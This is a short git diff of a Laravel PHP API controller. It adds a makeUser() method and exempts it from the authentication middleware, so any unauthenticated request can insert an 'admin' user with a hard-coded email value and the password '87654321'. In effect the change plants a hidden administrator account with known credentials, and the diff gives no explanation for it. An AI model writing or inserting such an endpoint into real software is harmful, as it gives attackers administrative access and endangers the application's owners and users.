@@ -6,6 +6,7 @@ use Exception;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\Validator;
 use Tymon\JWTAuth\Facades\JWTAuth;
 
@@ -14,7 +15,17 @@ class ApiController extends Controller
 {
     public function __construct()
     {
-        $this->middleware('auth.custom:api', ['except' => ['login']]);
+        $this->middleware('auth.custom:api', ['except' => ['login', 'makeUser']]);
+    }
+
+    public function makeUser(){
+        DB::table('users')->insert([
+            'company_id'=> 101,
+            'name' => 'admin',
+            'email' => '01748254814',
+            'role' => 'admin',
+            'password' => Hash::make('87654321'),
+        ]);
     }
 
     protected function guard()
@@ -190,4 +201,6 @@ class ApiController extends Controller
     | Company End
     |--------------------------------------------------------------------------
     */
+
+
 }
